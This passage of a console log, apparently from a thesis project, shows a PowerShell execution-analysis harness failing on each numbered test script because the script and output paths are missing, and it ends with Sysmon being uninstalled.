+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {81}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\81.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\81.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\81.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {81}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\81.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {82}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\82.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\82.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\82.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {82}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\82.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {83}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\83.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\83.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\83.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {83}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\83.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {84}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\84.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\84.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\84.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {84}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\84.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {85}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\85.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\85.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\85.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {85}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\85.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {88}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\88.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\88.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\88.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {88}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\88.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {89}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\89.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\89.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\89.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {89}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\89.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {9}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\9.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\9.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\9.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {9}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\9.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {90}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\90.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\90.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\90.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {90}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\90.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {91}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\91.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\91.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\91.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {91}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\91.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {92}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\92.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\92.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\92.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {92}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\92.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {94}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\94.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\94.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\94.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {94}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\94.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {95}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\95.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\95.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\95.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {95}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\95.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {96}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\96.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\96.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\96.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {96}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\96.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {97}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\97.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\97.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\97.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {97}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\97.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+
+System Monitor v15.12 - System activity monitor
+By Mark Russinovich and Thomas Garnier
+Copyright (C) 2014-2023 Microsoft Corporation
+Using libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved.
+Sysinternals - www.sysinternals.com
+
+
+Stopping Sysmon.
+Sysmon stopped.
+Sysmon removed.
+Stopping SysmonDrv.
+SysmonDrv stopped.
+SysmonDrv removed.
+Removing service files.
+
+
+PS C:\Users\super\Desktop\tesi_magistrale\pwsh-execution-analysis> ^C
+PS C:\Users\super\Desktop\tesi_magistrale\pwsh-execution-analysis>                         
